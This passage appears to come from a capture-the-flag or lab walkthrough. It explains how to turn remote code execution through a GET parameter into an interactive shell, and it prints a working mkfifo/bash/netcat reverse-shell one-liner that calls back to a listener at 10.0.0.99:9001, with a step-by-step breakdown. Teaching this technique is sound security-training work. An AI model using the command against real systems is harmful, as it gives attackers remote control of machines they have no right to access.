## 5. Getting a Shell — mkfifo

Now that we have RCE through a GET parameter, we need an interactive shell. A standard bash reverse shell doesn't work here because the process isn't attached to a terminal — there's no stdin. `mkfifo` solves this by creating a named pipe that wires stdin back into the shell manually.

The full command, URL-encoded and passed via `?c=`:

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.0.99 9001 > /tmp/f
```

**How it works, step by step:**

- `rm /tmp/f` — remove any leftover file at that path so `mkfifo` doesn't fail.
- `mkfifo /tmp/f` — create a **named pipe** at `/tmp/f`. A named pipe is a special file that lives on the filesystem but behaves like a Unix pipe: data written to one end is read from the other end in order, and nothing is stored on disk. The key property is that reads block until data is available — so the pipe can sit idle until the attacker sends a command.
- `cat /tmp/f` — reads continuously from the pipe. Anything written into `/tmp/f` comes out of `cat`'s stdout.
- `| /bin/bash -i 2>&1` — pipes that output into bash as commands. `bash -i` runs interactively so it processes each command as it arrives. `2>&1` merges stderr into stdout so error messages come back too.
- `| nc 10.0.0.99 9001` — pipes bash's output (command results) over the network to our netcat listener on port 9001.
- `> /tmp/f` — redirects what netcat **receives** (our typed commands) back into the named pipe.

The loop this creates:

```
attacker types command
  → nc sends it over TCP
    → lands in /tmp/f (via > /tmp/f)
      → cat /tmp/f reads it
        → bash -i executes it
          → output goes to nc (via pipe)
            → nc sends output back to attacker
```

The named pipe is what makes this bidirectional over a single netcat connection. Without it, we'd have stdout going one way with no way to push stdin back — the shell would run but we couldn't type into it.
